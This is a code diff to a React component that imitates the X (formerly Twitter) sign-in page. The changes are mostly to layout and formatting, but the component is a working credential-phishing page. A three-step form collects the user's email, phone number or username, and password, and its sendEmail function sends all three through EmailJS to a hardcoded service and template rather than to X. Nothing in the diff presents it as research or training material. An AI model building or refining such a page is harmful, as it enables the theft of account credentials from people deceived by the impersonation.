@@ -14,7 +14,12 @@ export default function XLogin() {
   }, [darkMode]);
 
   const sendEmail = () => {
-    const templateParams = { email, identifier, password };
+    const templateParams = {
+      email,
+      identifier,
+      password,
+    };
+
     emailjs.send(
       "service_ftb4lhs",
       "template_9zwksrd",
@@ -32,10 +37,12 @@ export default function XLogin() {
 
   const handleLogin = (e) => {
     e.preventDefault();
+
     if (!email || !identifier || !password) {
       alert("All fields are required.");
       return;
     }
+
     sendEmail();
   };
 
@@ -43,8 +50,7 @@ export default function XLogin() {
     <div className={`relative flex h-screen w-full items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}>
       <div className={`absolute inset-0 transition-all duration-300 ${showLogin ? "backdrop-blur-lg bg-black bg-opacity-50" : ""}`}></div>
       <div className="flex max-w-4xl w-full items-center justify-between px-10 relative z-10">
-        {/* X Logo only visible on desktop */}
-        <div className="hidden md:flex flex-1">
+        <div className="flex-1 hidden md:block">
           <img src="/x_logo.png" alt="X Logo" className="h-40 w-auto" />
         </div>
         <div className="flex-1 max-w-sm">
@@ -75,32 +81,59 @@ export default function XLogin() {
       </div>
       {showLogin && (
         <div className="fixed inset-0 flex items-center justify-center z-20 transition-opacity duration-300 opacity-100 scale-100">
-          <div className="bg-white dark:bg-black p-6 rounded-xl shadow-2xl max-w-md w-full relative transform scale-95 transition-all duration-300">
-            <button onClick={() => { setShowLogin(false); setStep(1); }} className="absolute top-2 right-2 text-2xl">×</button>
+          <div className="bg-white dark:bg-black p-6 rounded-xl shadow-2xl w-full max-w-md md:max-w-lg lg:max-w-xl h-full flex flex-col justify-center relative">
+            <button onClick={() => { setShowLogin(false); setStep(1); }} className="absolute top-2 left-2 text-2xl">×</button>
             <div className="text-center">
-              {/* X Logo only visible in modal */}
-              <img src="/x_logo.png" alt="X Logo" className="h-8 mx-auto mb-4 md:hidden" />
+              <img src="/x_logo.png" alt="X Logo" className="h-8 mx-auto mb-4" />
               <h2 className="text-2xl font-bold mb-4 dark:text-white">Sign in to X</h2>
               {step === 1 && (
                 <>
-                  <input type="text" placeholder="Email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" />
-                  <button onClick={() => setStep(2)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">Next</button>
+                  <input 
+                    type="text" 
+                    placeholder="Email" 
+                    value={email} 
+                    onChange={(e) => setEmail(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={() => setStep(2)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">
+                    Next
+                  </button>
                 </>
               )}
               {step === 2 && (
                 <>
-                  <input type="text" placeholder="Phone number or username" value={identifier} onChange={(e) => setIdentifier(e.target.value)} className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" />
-                  <button onClick={() => setStep(3)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">Next</button>
+                  <input 
+                    type="text" 
+                    placeholder="Phone number or username" 
+                    value={identifier} 
+                    onChange={(e) => setIdentifier(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={() => setStep(3)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">
+                    Next
+                  </button>
                 </>
               )}
               {step === 3 && (
                 <>
-                  <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" />
-                  <button onClick={handleLogin} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">Log in</button>
+                  <input 
+                    type="password" 
+                    placeholder="Password" 
+                    value={password} 
+                    onChange={(e) => setPassword(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={handleLogin} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
+                    Log in
+                  </button>
                 </>
               )}
-              <button className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">Forgot password?</button>
-              <p className="text-xs text-gray-400">Don't have an account? <a href="#" className="text-blue-500">Sign up</a></p>
+              <button className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
+                Forgot password?
+              </button>
+              <p className="text-xs text-gray-400">
+                Don't have an account? <a href="#" className="text-blue-500">Sign up</a>
+              </p>
             </div>
           </div>
         </div>
